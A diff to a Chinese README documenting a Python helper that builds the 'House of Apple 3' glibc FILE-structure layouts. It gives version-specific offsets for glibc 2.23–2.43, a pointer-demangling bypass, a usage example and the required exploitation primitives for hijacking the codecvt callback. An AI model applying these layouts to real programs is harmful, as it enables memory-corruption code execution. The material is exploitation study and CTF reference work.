@@ -77,37 +77,122 @@ struct {
 
 ## Python 离线板子
 
-[`apple3.py`](./apple3.py) 按三份 PoC 生成 `_codecvt`、fake step、wide buffer 和 FILE 入口字段。
+[`apple3.py`](./apple3.py) 提供 `build_house_of_apple3`，生成 codecvt 回调最终消费点的对象布局。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+fgetwc(fp)
+  -> _IO_wfile_underflow
+  -> __libio_codecvt_in
+  -> fake codecvt / fake __gconv_step
+  -> __fct 回调
+```
+
+### 对应 PoC
+
+- [`poc_codecvt_vtable_sink_2.23_2.29.c`](./poc_codecvt_vtable_sink_2.23_2.29.c)；
+- [`poc_codecvt_sink_2.30.c`](./poc_codecvt_sink_2.30.c)；
+- [`poc_codecvt_sink_2.31_2.43.c`](./poc_codecvt_sink_2.31_2.43.c)。
+
+### 版本与 ABI 布局
+
+| glibc | fake codecvt 布局 | 回调槽 |
+|---|---|---|
+| 2.23～2.29 | 直接函数表 | `codecvt + 0x18` 的 `__codecvt_do_in` |
+| 2.30 | `__gconv_info` union：`+0x00=nsteps`、`+0x08=steps` | `fake_step + 0x28` 的 `__fct` |
+| 2.31～2.43 | 现代 `_IO_iconv_t`：`+0x00=step` | `fake_step + 0x28` 的 `__fct` |
+
+`__gconv_step.__shlib_handle` 位于 `fake_step + 0x00`。令其为 0 可避免 `PTR_DEMANGLE`，让 `__fct` 按明文函数指针调用。
+
+### 最小使用示例
 
 ```python
 from apple3 import build_house_of_apple3
 
 writes = build_house_of_apple3(
     "2.35",
-    file_addr=fake_file,
-    fake_codecvt_addr=fake_codecvt,
-    fake_step_addr=fake_step,
-    callback_addr=callback,
-    wide_data_addr=wide_data,
-    wide_output_addr=wide_output,
-    external_input_addr=input_buffer,
-    current_flags=known_flags,
+    file_addr=0x100000,          # 被覆盖 FILE
+    fake_codecvt_addr=0x200000,  # fake codecvt / _IO_iconv_t
+    fake_step_addr=0x201000,     # fake __gconv_step（2.30+ 消费）
+    callback_addr=0x401234,      # do_in / __fct 回调
+    wide_data_addr=0x202000,     # wide_data
+    wide_output_addr=0x203000,   # wide buffer
+    external_input_addr=0x204000,# 窄字符输入
 )
+
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
+
+### 参数
 
 | 参数 | 含义 |
 |---|---|
-| `version` | 目标 glibc 版本；2.23～2.29 使用 codecvt `+0x18`，2.30 使用 `+0x08 -> step`，2.31～2.43 使用 `+0x00 -> step`。 |
-| `file_addr` | 被覆盖的 FILE 地址。 |
-| `fake_codecvt_addr` | fake `_IO_codecvt`/`_IO_iconv_t` 地址，写入 `FILE + 0x98`。 |
-| `fake_step_addr` | 2.30 及以上 fake `__gconv_step` 地址；旧 ABI 不消费该对象，但仍要求显式传入以避免隐式地址推导。 |
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
+| `file_addr` | 被覆盖 FILE 地址。 |
+| `fake_codecvt_addr` | fake `_IO_codecvt`/`_IO_iconv_t` 地址，写入 `FILE+0x98` 的 `_codecvt`。 |
+| `fake_step_addr` | 2.30 及以上 fake `__gconv_step` 地址；2.23～2.29 的旧 ABI 不消费该对象。 |
 | `callback_addr` | codecvt `do_in` 或 `__gconv_step.__fct` 回调地址。 |
-| `wide_data_addr` | 真实或 fake `_IO_wide_data` 地址，写入 `FILE + 0xa0`。 |
-| `wide_output_addr` | wide buffer 起点；PoC 按 `+0x20` 生成结束地址。 |
-| `external_input_addr` | 窄字符输入区起点；PoC 用一字节输入让 `fgetwc` 进入转换路径。 |
-| `current_flags` | 已知 `_flags` 时传入；函数清除 `EOF_SEEN` 和 `NO_READS`，未知时省略。 |
+| `wide_data_addr` | fake/真实 `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
+| `wide_output_addr` | wide buffer 起点；函数按 `+0x20` 生成结束地址。 |
+| `external_input_addr` | 窄字符输入区起点；函数按 `+0x1` 生成结束地址，让 `fgetwc` 进入转换路径。 |
+| `current_flags` | 当前 `_flags` 值；传入后清除 `EOF_SEEN | NO_READS`，未知时省略。 |
 
-返回 `MemoryWrite` 元组。函数只生成消费点布局，不负责 libc 投递、primary vtable、`fgetwc` 触发或 callback 后续逻辑。
+### 返回对象
+
+返回 `MemoryWrite` 元组。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+FILE 字段写入（file_addr 处）：
+    +0x98  _codecvt = fake_codecvt_addr
+    +0xa0  _wide_data = wide_data_addr
+    +0xc0  _mode = 1
+    +0x08/+0x10/+0x18  _IO_read_base/_ptr/_end = external_input（end +1）
+    +0x00  _flags（可选，4 字节）
+
+wide_data buffers（wide_data_addr 处，0x40 字节）：
+    +0x00  _IO_read_ptr = wide_output_addr
+    +0x08  _IO_read_end = wide_output_addr
+    +0x10  _IO_read_base = wide_output_addr
+    +0x30  _IO_buf_base = wide_output_addr
+    +0x38  _IO_buf_end = wide_output_addr + 0x20
+
+fake codecvt（fake_codecvt_addr 处）：
+    按版本写 do_in 槽或 step 指针
+
+fake __gconv_step（fake_step_addr 处，2.30+）：
+    +0x00  __shlib_handle = 0
+    +0x28  __fct = callback_addr
+```
+
+### 调用者必须提供
+
+```text
+libc 基址
+能把 FILE 置于宽模式并触发 fgetwc 的入口
+能覆盖 FILE->_codecvt 和 _wide_data 的原语
+2.30+ 的可写 fake __gconv_step 区
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责 largebin 等投递原语
+不触发 fgetwc
+不处理 codecvt out/length/sync 等其他入口
+```
 
 ## 迁移与调试
 
